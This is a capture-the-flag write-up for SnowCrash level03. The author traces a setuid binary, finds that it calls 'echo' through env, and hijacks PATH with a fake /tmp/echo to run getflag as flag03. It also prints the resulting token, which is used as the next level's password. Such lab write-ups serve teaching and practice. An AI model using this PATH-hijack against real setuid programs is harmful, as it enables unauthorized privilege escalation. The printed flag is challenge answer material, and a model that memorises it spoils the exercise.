# Objective

As `level03`, the goal is to exploit a vulnerability to gain `flag03`'s privileges and read the flag, which is the password for `level04`.

The flag is gained through the command `getflag`, run as `flag03`.

```sh
level03@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```


# Content of home

The home folder contains an interesting file, `level03`.

```sh
level03@SnowCrash:~$ pwd
/home/user/level03

level03@SnowCrash:~$ ll
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile*
```

# Resolution

### File type

Let us inquire about the `level03` file.

```sh
level03@SnowCrash:~$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Since it can be executed, let us execute it!
```
level03@SnowCrash:~$ ./level03
Exploit me
```

### `strace`
Let us run system call tracer `strace` on it.

```sh
level03@SnowCrash:~$ strace ./level03
execve("./level03", ["./level03"], [/* 15 vars */]) = 0
#
# linker and loader related stuff added by the compiler
#
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff77c) = 4896
waitpid(4896, Exploit me
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 4896
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD (Child exited) @ 0 (0) ---
exit_group(0)                           = ?
```

Nothing.


### `ltrace`

Let us run the librairy call tracer 'ltrace' now.

```sh
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff864, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                     = 2003
geteuid()                                                                                                     = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                           = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                           = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                        = 0
+++ exited (status 0) +++
```

Interesting! At some point, the program wants to execute the `echo` command in order to print "Exploit me"!
What if we replaced the `echo` command?

Let us do so.

```sh
level03@SnowCrash:~$ cat > /tmp/echo
/bin/getflag

level03@SnowCrash:~$ chmod +x /tmp/echo
```

Now, let us corrupt the PATH environment variable to make it point to our echo, and let us run `level03`.

```sh
level03@SnowCrash:~$ (export PATH=/tmp; ./level03)
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

level03@SnowCrash:~$ su - level04
Password: #qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$ 
```

Et voilà!